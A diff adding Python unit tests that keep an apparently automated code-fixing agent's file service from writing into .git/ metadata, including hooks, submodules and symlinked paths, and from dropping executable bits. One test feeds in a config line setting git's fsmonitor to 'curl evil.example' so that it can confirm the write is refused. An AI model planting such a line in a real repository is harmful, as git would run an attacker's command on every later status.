@@ -1,9 +1,10 @@
 from tests import hermetic  # noqa: F401 — throwaway state dir; see tests/hermetic.py
+import os
 import tempfile
 import unittest
 from pathlib import Path
 
-from engine.fs import MAX_DIFF_BYTES, FileSystemService, PathEscapeError
+from engine.fs import MAX_DIFF_BYTES, FileSystemService, GitMetadataError, PathEscapeError
 from typing import Any
 
 
@@ -150,6 +151,30 @@ class TestWhatApplyActuallyChanged(unittest.TestCase):
         self.fs.apply([{"path": "a.txt", "action": "create", "content": "a\n"}], dry_run=False)
         self.assertEqual(sorted(p.name for p in self.root.iterdir()), ["a.txt"])
 
+    @unittest.skipUnless(os.name == "posix", "the executable bit is a POSIX idea")
+    def test_an_edit_keeps_the_files_permissions(self) -> None:
+        # The write is temp-file + rename, and the temp file is born with the
+        # process default. Renaming it over an executable script dropped the
+        # executable bit, so `run.sh` came back 644 and the commit the fixer
+        # then made recorded a mode change nobody asked for.
+        script = self.root / "run.sh"
+        script.write_text("#!/bin/sh\necho old\n", encoding="utf-8")
+        script.chmod(0o755)
+
+        self.fs.apply([{"path": "run.sh", "action": "update", "content": "#!/bin/sh\necho new\n"}], dry_run=False)
+
+        self.assertEqual(self.fs.read_text("run.sh"), "#!/bin/sh\necho new\n")
+        self.assertEqual(script.stat().st_mode & 0o777, 0o755)
+
+    @unittest.skipUnless(os.name == "posix", "the executable bit is a POSIX idea")
+    def test_a_new_file_is_not_made_executable_by_an_edit_of_another_file(self) -> None:
+        # The other half of the same rule: there is no earlier mode to honour
+        # for a file that did not exist, so a create keeps whatever the process
+        # default is rather than inheriting anything.
+        self.fs.apply([{"path": "fresh.sh", "action": "create", "content": "#!/bin/sh\n"}], dry_run=False)
+
+        self.assertEqual((self.root / "fresh.sh").stat().st_mode & 0o111, 0)
+
     def test_read_text_or_none_is_none_exactly_when_there_is_no_text(self) -> None:
         (self.root / "ok.txt").write_text("text\n", encoding="utf-8")
         (self.root / "blob.bin").write_bytes(b"\x00\x01binary")
@@ -285,6 +310,75 @@ class TestEditAction(unittest.TestCase):
                   "edits": [{"old_text": "x", "new_text": "y"}]}],
                 dry_run=False,
             )
+
+
+class TestTheRepositorysOwnMetadataIsNotAFilesPath(unittest.TestCase):
+    """`.git/` is inside the workspace and outside what a file write may touch.
+
+    Two failures, one shape: `.git/config` can carry a credential in a remote
+    URL, and setting `core.fsmonitor` there names a command git runs on every
+    later `status` — the librarian's and the user's, long after the goal that
+    wrote it. A submodule or a linked worktree keeps a second `.git` a level
+    down, and a symlink reaches one without spelling it, so all three are here.
+    """
+
+    def setUp(self) -> None:
+        self.temp_dir = tempfile.TemporaryDirectory()
+        self.root = Path(self.temp_dir.name).resolve()
+        self.fs = FileSystemService(str(self.root))
+        (self.root / ".git").mkdir()
+        (self.root / ".git" / "config").write_text("[core]\n", encoding="utf-8")
+
+    def tearDown(self) -> None:
+        self.temp_dir.cleanup()
+
+    def test_a_write_into_git_is_refused_and_leaves_the_file_alone(self) -> None:
+        with self.assertRaises(GitMetadataError):
+            self.fs.apply(
+                [{"path": ".git/config", "action": "update",
+                  "content": "[core]\n\tfsmonitor = curl evil.example\n"}],
+                dry_run=False,
+            )
+        self.assertEqual((self.root / ".git" / "config").read_text(encoding="utf-8"), "[core]\n")
+
+    def test_a_hook_cannot_be_written_either(self) -> None:
+        with self.assertRaises(GitMetadataError):
+            self.fs.apply(
+                [{"path": ".git/hooks/pre-commit", "action": "create", "content": "#!/bin/sh\n"}],
+                dry_run=False,
+            )
+        self.assertFalse((self.root / ".git" / "hooks" / "pre-commit").exists())
+
+    def test_a_read_returns_nothing_rather_than_the_config(self) -> None:
+        # Both read doors already treat a path that escapes the workspace this
+        # way — `read_text_or_none` answers "nothing to read here" and the
+        # stricter `read_text` raises — so git's metadata behaves like `../x`
+        # rather than getting a third, softer answer of its own.
+        self.assertIsNone(self.fs.read_text_or_none(".git/config"))
+        with self.assertRaises(PathEscapeError):
+            self.fs.read_text(".git/config")
+
+    def test_the_same_refusal_two_levels_down_and_through_a_symlink(self) -> None:
+        # A submodule's own metadata, and a link that reaches the root's without
+        # naming it. `resolve` asks where a path lands, so both are the same
+        # answer as the literal spelling above.
+        nested = self.root / "vendor" / "sub" / ".git"
+        nested.mkdir(parents=True)
+        (nested / "config").write_text("[core]\n", encoding="utf-8")
+        with self.assertRaises(GitMetadataError):
+            self.fs.resolve("vendor/sub/.git/config")
+
+        (self.root / "shortcut").symlink_to(self.root / ".git", target_is_directory=True)
+        with self.assertRaises(GitMetadataError):
+            self.fs.resolve("shortcut/config")
+
+    def test_a_file_merely_named_like_it_is_still_ordinary(self) -> None:
+        # The rule is about the directory, not the string: `.gitignore` and
+        # `.github/` are workspace files the fixer has every reason to edit.
+        (self.root / ".gitignore").write_text("build/\n", encoding="utf-8")
+        self.assertEqual(self.fs.resolve(".gitignore"), self.root / ".gitignore")
+        (self.root / ".github" / "workflows").mkdir(parents=True)
+        self.assertTrue(self.fs.resolve(".github/workflows/ci.yml"))
 
 
 if __name__ == "__main__":
